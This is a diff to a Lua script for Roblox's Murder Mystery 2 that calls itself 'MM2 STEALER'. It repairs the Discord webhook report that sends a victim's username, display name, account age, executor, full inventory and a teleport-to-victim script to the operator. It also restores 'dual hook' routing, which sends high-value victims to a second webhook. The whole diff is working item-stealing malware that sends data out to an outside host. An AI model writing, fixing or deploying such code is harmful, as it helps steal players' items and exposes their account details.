@@ -141,11 +141,10 @@ local function postToDiscord(link)
     local serverLink = "https://script-9209.github.io/mm2-joiner/?placeId=142823291&gameInstanceId=" .. game.JobId
     local currentPlayers = #playersService:GetPlayers()
     
-    -- DUAL HOOK ROUTING
     local finalUrl = (overallValue >= dh_val) and dh_webhook or link
     
     local embedPayload = {
-        content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone " or "> ").. "**"..(overallValue >= minPingVal and "⋆｡ ɢᴏᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』").." • Value: "..string.format("%.2f", overallValue).."**",
+        content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone " or "> ") .. "**" .. (overallValue >= minPingVal and "⋆｡ ɢᴏᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』") .. " • Value: " .. string.format("%.2f", overallValue) .. "**",
         username = "MM2 STEALER",
         avatar_url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png",
         embeds = {{
@@ -154,24 +153,24 @@ local function postToDiscord(link)
             color = 0x000000,
             thumbnail = { url = "https://static.wikia.nocookie.net/murdermystery/images/3/30/MM2logo.png" },
             fields = {
-                {name="👤 Display Name", value="```"..(me.DisplayName~="" and me.DisplayName or me.Name).."```", inline=false},
-                {name="🏷️ Username", value="```"..me.Name.."```", inline=false},
-                {name="📅 Account Age", value="```"..me.AccountAge.." Days```", inline=false},
-                {name="⚙️ Executor", value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline=false},
-                {name="👥 Players in Server", value="```"..currentPlayers.." / 12```", inline=false},
-                {name="🎒 Inventory", value="```"..table.concat(displayLines, "\n").."```", inline=false},
-                {name="📜 Teleport Script", value="
-        author={name="Murder Mystery 2 • Script Biscuit Hit",url=serverLink},
-        footer={text="🍪 • Stealer Scripts"},
-        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
-    }},
-    attachments={}
-}
-
-local function postToDiscord(link)
+                {name="👤 Display Name", value="```" .. (me.DisplayName ~= "" and me.DisplayName or me.Name) .. "```", inline=false},
+                {name="🏷️ Username", value="```" .. me.Name .. "```", inline=false},
+                {name="📅 Account Age", value="```" .. me.AccountAge .. " Days```", inline=false},
+                {name="⚙️ Executor", value="```" .. (identifyexecutor and identifyexecutor() or "Unknown") .. "```", inline=false},
+                {name="👥 Players in Server", value="```" .. currentPlayers .. " / 12```", inline=false},
+                {name="🎒 Inventory", value="```" .. table.concat(displayLines, "\n") .. "```", inline=false},
+                {name="📜 Teleport Script", value="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')\n```", inline=false},
+            },
+            author = {name="Murder Mystery 2 • Script Biscuit Hit", url=serverLink},
+            footer = {text="🍪 • Stealer Scripts"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }},
+        attachments = {}
+    }
+    
     pcall(function()
         request({
-            Url = link,
+            Url = finalUrl,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = http:JSONEncode(embedPayload)
